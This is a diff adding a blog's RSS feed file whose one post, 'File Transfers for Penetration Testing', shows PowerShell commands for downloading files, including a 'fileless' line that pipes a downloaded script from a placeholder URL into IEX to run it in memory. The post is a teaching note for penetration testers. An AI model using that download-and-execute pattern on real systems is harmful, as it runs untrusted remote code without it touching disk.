@@ -1,0 +1,56 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>PostToBes on </title>
+    <link>//localhost:1313/posttobe/</link>
+    <description>Recent content in PostToBes on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 30 Jul 2024 00:00:00 +0000</lastBuildDate>
+    <atom:link href="//localhost:1313/posttobe/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>File Transfers for Penetration Testing</title>
+      <link>//localhost:1313/posttobe/filetransfers/</link>
+      <pubDate>Tue, 30 Jul 2024 00:00:00 +0000</pubDate>
+      <guid>//localhost:1313/posttobe/filetransfers/</guid>
+      <description>The Basics Windows Download Files using Powershell The esiast way to download files using Powershell is to use the Net.WebClient class. This class provides a intuitive way to download HTTP HTTPS and FTP files.
+$webClient = New-Object System.Net.WebClient $webClient.DownloadFile(&amp;#34;http://example.com/file.txt&amp;#34;, &amp;#34;C:\path\to\file.txt&amp;#34;) Ofcourse, you can also use the Invoke-WebRequest cmdlet which is the windows equivalent of curl or wget. The DownloadFile method is used to download a file to a specified location.</description>
+      <content:encoded><![CDATA[<h2 id="the-basics">The Basics</h2>
+<hr>
+<h2 id="windows">Windows</h2>
+<h3 id="download-files-using-powershell">Download Files using Powershell</h3>
+<p>The esiast way to download files using Powershell is to use the <code>Net.WebClient</code> class. This class provides a intuitive way to download HTTP HTTPS and FTP files.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$webClient = New-Object System.Net.WebClient
+</span></span><span style="display:flex;"><span>$webClient.DownloadFile(<span style="color:#e6db74">&#34;http://example.com/file.txt&#34;</span>, <span style="color:#e6db74">&#34;C:\path\to\file.txt&#34;</span>)
+</span></span></code></pre></div><p>Ofcourse, you can also use the <code>Invoke-WebRequest</code> cmdlet which is the windows equivalent of <code>curl</code> or <code>wget</code>. The <code>DownloadFile</code> method is used to download a file to a specified location.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://example.com/file.txt&#34;</span> -OutFile <span style="color:#e6db74">&#34;C:\path\to\file.txt&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># or</span>
+</span></span><span style="display:flex;"><span>curl -Uri <span style="color:#e6db74">&#34;http://example.com/file.txt&#34;</span> -OutFile <span style="color:#e6db74">&#34;C:\path\to\file.txt&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># or</span>
+</span></span><span style="display:flex;"><span>wget -Uri <span style="color:#e6db74">&#34;http://example.com/file.txt&#34;</span> -OutFile <span style="color:#e6db74">&#34;C:\path\to\file.txt&#34;</span>
+</span></span></code></pre></div><h3 id="download-fileless-using-powershell">Download Fileless using Powershell</h3>
+<p>In very rare cases, you may need to download a file without writing it to disk. This can be done using the <code>Net.WebClient</code> class and the <code>DownloadString</code> method. The IEX command can be used to execute the downloaded script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$webClient = New-Object System.Net.WebClient
+</span></span><span style="display:flex;"><span>$webClient.DownloadString(<span style="color:#e6db74">&#34;http://example.com/file.txt&#34;</span>) | IEX
+</span></span></code></pre></div><hr>
+<script src="https://giscus.app/client.js"
+        data-repo="jpmcb/blog"
+        data-repo-id="MDEwOlJlcG9zaXRvcnkxMTYxODMyNjg="
+        data-category="Blog comments"
+        data-category-id="DIC_kwDOBuzQ5M4CTbHW"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="dark_dimmed"
+        data-lang="en"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+]]></content:encoded>
+    </item>
+  </channel>
+</rss>
